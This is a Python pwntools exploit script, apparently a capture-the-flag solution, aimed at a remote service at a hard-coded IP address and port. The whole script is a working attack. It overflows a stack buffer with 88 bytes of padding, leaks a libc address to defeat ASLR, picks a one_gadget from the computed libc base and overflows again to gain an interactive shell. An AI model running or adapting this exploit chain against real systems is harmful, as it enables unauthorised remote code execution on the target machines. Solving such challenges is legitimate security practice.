#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

libc = ELF('./libc-2.23.so')

host, port = '34.159.129.6', '30550'

p = remote(host,port)

# address that return us a chunk of stack, and ask input again (find by bruteforcing address)
test = 0x4006fb

payload = 'A'*88+p64(0x4006fb)

p.sendafter('friend?\n' , payload)

buff = p.recv()
# get libc leak from stack
leak = u64(buff[0x10:0x18])
libc.address = leak - 0x3c5620
print('libc base (could be): '+hex(libc.address))

print(hexdump(buff))

onegadgets = one_gadget('libc.so.6', libc.address)

payload = 'A'*88+p64(onegadgets[1])
p.send(payload)

p.interactive()

